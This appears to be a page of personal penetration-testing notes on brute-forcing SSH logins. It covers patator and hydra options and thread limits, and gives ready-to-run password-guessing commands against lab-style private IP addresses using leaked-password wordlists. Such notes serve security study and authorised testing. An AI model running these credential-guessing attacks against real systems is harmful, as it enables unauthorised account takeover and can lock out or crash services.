<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bruteforcing</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 22/ssh - Bruteforcing</h1></strong><br />Considerations when bruteforcing SSH:<br />• It&#39;s slow<br />• It&#39;s not stealthy<br />• Be careful not to get locked out (only bruteforce if you&#39;re sure)<br /><br /><strong><h2>## Patator</h2></strong><br /><a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a><br />• Doesn&#39;t yet support hydra&#39;s -<code>e nsr</code> option (blank password, username as password, reverse of username)<br />• <code>persistent=0</code> slows down the bruteforce, but reduces false positives<br /><br /><code>-x ignore:mesg=</code> - only ignores line that match the entire provided string<br /><code>-x ignore:fgrep=</code> - ingores lines that match just part of the provided string<br /><code>-x ignore:egrep=</code> - use regular expressions to ignore lines<br /><br />Get example:<br /><code>patator ssh_login</code><br /><br /><code>patator ssh_login host=10.10.10.76 port=22022 user=FILE0 password=FILE1 0=usernames.txt 1=/usr/share/seclists/Passwords/darkweb2017-top1000.txt persistent=0 -x ignore:mesg=&#39;Authentication failed.&#39;</code><br /><br /><strong><h2>## Hydra</h2></strong><br />• If the SSH key exchange is old/not the standard, Hydra probably won&#39;t work. <br />   ◇ It tends to just fail/error out, and not tell you why, or just produce no results. In that case, use patator.<br /><br /><code>-v</code>: verbose<br /><code>-V</code>: print every password attempt<br /><code>-o</code>: write correct passwords to file instead of stdout<br /><code>-t</code> N: specify number of threads (use 4 for ssh, shit gets blocked otherwise)<br /><code>-s</code> PORT (if it&#39;s not running on a non-standard port)<br /><br /><code>-e nsr</code> = try &quot;n&quot; no password, &quot;s&quot; login as password (same), &quot;r&quot; reverse of username as login<br /><br /><code>-p</code> &lt;password&gt;<br /><code>-P</code> &lt;password list&gt;<br /><code>-l</code> &lt;username&gt;<br /><code>-L</code> &lt;username list&gt;<br /><br /><code>-f</code> terminate program if login found for user+pass (and move onto finding next pair)<br /><code>-F</code> terminate program if any user+pass pair is found (forget the other users)<br /><br /><code>-t 4</code> - for SSH you want to use 4 threads, the SSH service won&#39;t take any more<br />• For SSH use 4 threads<br />• For everything else, don&#39;t bother specifying<br />• If you want to not risk crashing the service, use a lower thread count<br /><br /><code>hydra -v -l john -P /usr/share/seclists/darkweb2017_top1000.txt -o john_top1000.txt ssh://192.168.1.186 -t 4 -f</code><br /><br /></div>
</body>
</html>
